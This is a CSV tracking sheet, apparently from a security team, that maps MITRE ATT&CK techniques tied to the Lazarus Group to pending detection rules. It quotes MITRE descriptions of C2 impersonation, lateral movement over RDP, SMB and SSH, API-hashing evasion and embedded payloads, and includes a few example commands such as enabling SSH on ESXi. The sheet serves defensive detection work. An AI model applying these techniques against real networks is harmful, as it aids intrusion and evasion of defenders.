Technique ID,Name,Tactics,Status,Linked Rule,Liczba wykryć,Author,Description,MITRE Link,ChangeHistory
T1001.003,Protocol or Service Impersonation,Command-And-Control,Pending,alerts\Lazarus_Group\T1001.003_Protocol_or_Service_Impersonation.html,,APT Matrix Generator,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.    Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.   Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",https://attack.mitre.org/techniques/T1001/003/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1005,Data from Local System,Collection,Pending,alerts\Lazarus_Group\T1005_Data_from_Local_System.html,,APT Matrix Generator,"Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.  Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system. ",https://attack.mitre.org/techniques/T1005/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1008,Fallback Channels,Command-And-Control,Pending,alerts\Lazarus_Group\T1008_Fallback_Channels.html,,APT Matrix Generator,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,https://attack.mitre.org/techniques/T1008/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1010,Application Window Discovery,Discovery,Pending,alerts\Lazarus_Group\T1010_Application_Window_Discovery.html,,APT Matrix Generator,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)  Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.",https://attack.mitre.org/techniques/T1010/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1012,Query Registry,Discovery,Pending,alerts\Lazarus_Group\T1012_Query_Registry.html,,APT Matrix Generator,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.  The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",https://attack.mitre.org/techniques/T1012/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1016,System Network Configuration Discovery,Discovery,Pending,alerts\Lazarus_Group\T1016_System_Network_Configuration_Discovery.html,,APT Matrix Generator,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).  Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024)  Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",https://attack.mitre.org/techniques/T1016/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1021.001,Remote Desktop Protocol,Lateral-Movement,Pending,alerts\Lazarus_Group\T1021.001_Remote_Desktop_Protocol.html,,APT Matrix Generator,Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.  Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)   Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware),https://attack.mitre.org/techniques/T1021/001/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1021.002,SMB/Windows Admin Shares,Lateral-Movement,Pending,alerts\Lazarus_Group\T1021.002_SMBWindows_Admin_Shares.html,,APT Matrix Generator,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.  SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.  Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",https://attack.mitre.org/techniques/T1021/002/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1021.004,SSH,Lateral-Movement,Pending,alerts\Lazarus_Group\T1021.004_SSH.html,,APT Matrix Generator,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.  SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",https://attack.mitre.org/techniques/T1021/004/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1027.007,Dynamic API Resolution,Defense-Evasion,Pending,alerts\Lazarus_Group\T1027.007_Dynamic_API_Resolution.html,,APT Matrix Generator,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.  API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)  To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.  Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",https://attack.mitre.org/techniques/T1027/007/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
T1027.009,Embedded Payloads,Defense-Evasion,Pending,alerts\Lazarus_Group\T1027.009_Embedded_Payloads.html,,APT Matrix Generator,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs)   Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage)   For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021)   Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",https://attack.mitre.org/techniques/T1027/009/,"[{""user"": ""UpdateBot"", ""time"": ""2025-06-10 22:29""}, {""user"": ""UpdateBot"", ""time"": ""2025-06-10 20:22""}, {""user"": ""Krzysztof K."", ""time"": ""2025-06-10 20:19""}, {""user"": ""APT Matrix Generator"", ""time"": ""2025-06-10 20:18""}]"
